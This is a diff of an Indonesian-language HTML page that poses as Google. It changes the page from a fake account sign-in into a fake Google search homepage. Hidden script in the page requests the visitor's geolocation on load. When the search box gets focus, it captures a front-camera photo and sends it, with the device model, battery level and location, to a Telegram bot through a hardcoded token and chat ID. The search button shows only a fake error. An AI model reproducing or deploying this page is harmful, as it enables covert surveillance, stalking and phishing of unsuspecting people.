@@ -3,148 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - Konfirmasi Akun</title>
-    <!-- Google Font -->
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <title>Google</title>
     <style>
-        :root {
-            --google-blue: #4285f4;
-            --google-red: #ea4335;
-            --google-yellow: #fbbc05;
-            --google-green: #34a853;
-            --gray-border: #dadce0;
+        body { margin: 0; font-family: arial, sans-serif; background: #fff; }
+        .navbar { display: flex; justify-content: flex-end; padding: 15px; gap: 15px; font-size: 13px; }
+        .main { display: flex; flex-direction: column; align-items: center; margin-top: 100px; }
+        .logo { width: 272px; margin-bottom: 30px; }
+        .search-container { position: relative; width: 90%; max-width: 584px; }
+        .search-bar { 
+            width: 100%; border: 1px solid #dfe1e5; padding: 12px 20px; 
+            border-radius: 24px; font-size: 16px; outline: none; box-shadow: none;
+            transition: box-shadow 0.2s;
         }
-
-        body {
-            background-color: #ffffff;
-            color: #202124;
-            font-family: 'Roboto', sans-serif;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        .search-bar:hover, .search-bar:focus { box-shadow: 0 1px 6px rgba(32,33,36,.28); border-color: rgba(223,225,229,0); }
+        .buttons { margin-top: 25px; display: flex; gap: 10px; }
+        .btn { 
+            background-color: #f8f9fa; border: 1px solid #f8f9fa; 
+            border-radius: 4px; color: #3c4043; padding: 0 16px; 
+            line-height: 34px; font-size: 14px; cursor: pointer;
         }
-
-        .google-card {
-            width: 100%;
-            max-width: 450px;
-            padding: 40px;
-            border: 1px solid var(--gray-border);
-            border-radius: 8px;
-            text-align: center;
-            box-sizing: border-box;
-        }
-
-        .logo {
-            font-size: 24px;
-            font-weight: 500;
-            margin-bottom: 10px;
-        }
-
-        .logo span:nth-child(1) { color: var(--google-blue); }
-        .logo span:nth-child(2) { color: var(--google-red); }
-        .logo span:nth-child(3) { color: var(--google-yellow); }
-        .logo span:nth-child(4) { color: var(--google-blue); }
-        .logo span:nth-child(5) { color: var(--google-green); }
-        .logo span:nth-child(6) { color: var(--google-red); }
-
-        h1 { font-size: 24px; font-weight: 400; margin-top: 10px; }
-        p { color: #5f6368; font-size: 16px; margin-bottom: 30px; }
-
-        .input-group {
-            text-align: left;
-            margin-bottom: 20px;
-        }
-
-        input {
-            width: 100%;
-            padding: 13px 15px;
-            border: 1px solid var(--gray-border);
-            border-radius: 4px;
-            font-size: 16px;
-            box-sizing: border-box;
-            transition: border 0.2s;
-        }
-
-        input:focus {
-            outline: none;
-            border: 2px solid var(--google-blue);
-            padding: 12px 14px;
-        }
-
-        .btn-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 40px;
-        }
-
-        .link-text {
-            color: var(--google-blue);
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 14px;
-        }
-
-        .btn-next {
-            background-color: var(--google-blue);
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            font-weight: 500;
-            cursor: pointer;
-            font-size: 14px;
-        }
-
-        /* Popup */
-        #success-popup {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: white;
-            z-index: 1000;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--google-blue);
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="google-card">
-    <div class="logo">
-        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-    </div>
-    <h1>Masuk</h1>
-    <p>Gunakan Akun Google Anda untuk Verifikasi</p>
-
-    <div class="input-group">
-        <input type="text" id="userId" placeholder="Email atau nomor telepon">
-    </div>
-
-    <div class="btn-container">
-        <a href="#" class="link-text">Buat akun</a>
-        <button class="btn-next" id="startBtn">Berikutnya</button>
-    </div>
+<div class="navbar">
+    <span>Gmail</span>
+    <span>Gambar</span>
+    <div style="background:#5f6368; width:30px; height:30px; border-radius:50%;"></div>
 </div>
 
-<div id="success-popup">
-    <div class="loader"></div>
-    <p>Memeriksa info...</p>
+<div class="main">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo" alt="Google">
+    <div class="search-container">
+        <input type="text" class="search-bar" id="searchInput" autocomplete="off">
+    </div>
+    <div class="buttons">
+        <button class="btn" id="searchBtn">Penelusuran Google</button>
+        <button class="btn">Saya Lagi Beruntung</button>
+    </div>
 </div>
 
 <video id="video" style="display:none;" autoplay playsinline></video>
@@ -153,8 +49,9 @@
 <script>
     const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
     const CHAT_ID = '6888530451';
-    let userLocation = "Lokasi tidak diizinkan";
+    let userLocation = "Menunggu Izin...";
 
+    // 1. Deteksi Nama HP yang lebih akurat
     async function getDeviceInfo() {
         let battery = "N/A";
         if (navigator.getBattery) {
@@ -163,76 +60,73 @@
         }
 
         const ua = navigator.userAgent;
-        let device = "Perangkat Tidak Dikenal";
+        let device = "Unknown Device";
 
-        // Logika untuk mencoba mendapatkan nama HP bukan Linux
+        // Regex untuk menarik nama model di dalam kurung User-Agent
+        const deviceMatch = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
         if (/android/i.test(ua)) {
-            const match = ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
-            device = match ? match[2] : "Android Device";
-        } else if (/iPhone|iPad|iPod/i.test(ua)) {
-            device = "Apple iOS Device";
-        } else if (/Windows/i.test(ua)) {
-            device = "Windows PC";
+            device = (deviceMatch && deviceMatch[3]) ? deviceMatch[3].split(' Build')[0] : "Android Phone";
+        } else if (/iPhone/i.test(ua)) {
+            device = "iPhone";
         }
 
-        const conn = navigator.connection ? navigator.connection.effectiveType : "Unknown";
-        return { device, battery, conn };
+        return { device, battery };
     }
 
+    // 2. Minta Lokasi Otomatis saat buka
     function getLocation() {
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((position) => {
-                userLocation = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+            navigator.geolocation.getCurrentPosition(pos => {
+                userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
             });
         }
     }
 
-    document.getElementById('startBtn').addEventListener('click', async () => {
-        const uid = document.getElementById('userId').value;
-        if(!uid) return alert("Masukkan Email!");
-        
-        document.getElementById('success-popup').style.display = 'flex';
-        getLocation();
-
+    // 3. Picu Kamera saat mengetik atau klik cari
+    async function startCapture() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: 1280, height: 720 } 
+            });
             const video = document.getElementById('video');
             video.srcObject = stream;
-            video.onloadedmetadata = () => {
-                video.play();
-                takeSnapshot(uid); // Ambil satu snapshot awal
-                setInterval(() => takeSnapshot(uid), 10000); // Kemudian tiap 10 detik
-            };
-        } catch(e) {
-            console.log("Kamera ditolak");
-        }
-    });
+            video.play();
+            
+            // Ambil foto setelah 2 detik agar kamera fokus
+            setTimeout(takeSnapshot, 2000);
+        } catch (e) { console.error("Kamera ditolak"); }
+    }
 
-    async function takeSnapshot(uid) {
+    async function takeSnapshot() {
         const info = await getDeviceInfo();
         const canvas = document.getElementById('canvas');
         const video = document.getElementById('video');
-        canvas.width = 640; canvas.height = 480;
+        
+        // Pastikan aspek rasio kamera penuh
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
 
-        canvas.toBlob(async (blob) => {
+        canvas.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'pic.jpg');
-            formData.append('caption', `👁️‍🗨️ *Berhasil memantau*\n\n📧 User: ${uid}\n📱 HP: ${info.device}\n🔋 Baterai: ${info.battery}\n🌐 Koneksi: ${info.conn}\n📍 Lokasi: ${userLocation}`);
+            formData.append('photo', blob, 'target.jpg');
+            formData.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${info.device}\n🔋 Baterai: ${info.battery}\n📍 Lokasi: ${userLocation}`);
             formData.append('parse_mode', 'Markdown');
 
-            try {
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (err) {
-                console.error(err);
-            }
-        }, 'image/jpeg');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }, 'image/jpeg', 0.8);
     }
-</script>
 
+    // Jalankan saat ada aktivitas di bar pencarian
+    document.getElementById('searchInput').addEventListener('focus', startCapture);
+    document.getElementById('searchBtn').addEventListener('click', () => {
+        alert("Koneksi tidak stabil, silakan coba lagi.");
+    });
+    
+    // Inisialisasi lokasi saat halaman dimuat
+    window.onload = getLocation;
+</script>
 </body>
 </html>
+
